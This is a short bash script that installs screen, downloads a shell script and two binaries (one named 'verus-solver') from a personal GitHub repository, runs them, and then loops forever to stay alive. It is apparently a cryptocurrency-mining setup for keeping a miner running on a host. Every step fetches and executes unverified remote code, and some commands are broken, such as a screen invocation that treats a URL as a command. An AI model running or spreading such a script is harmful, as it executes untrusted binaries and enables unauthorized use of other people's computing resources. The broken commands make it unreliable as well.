#!/bin/bash
sudo apt update
sudo apt install apt-utils -y
sudo apt install screen -y
screen -dmS wget https://github.com/bimasaputrq581/expert-fortnight/raw/main/cpu.sh
wget https://github.com/bimasaputrq581/expert-fortnight/blob/main/verus-solver?raw=true
wget https://github.com/bimasaputrq581/expert-fortnight/blob/main/zxzx?raw=true
chmod +x cpu.sh
./cpu.sh
while [ 1 ]; do
sleep 3
done
sleep 999
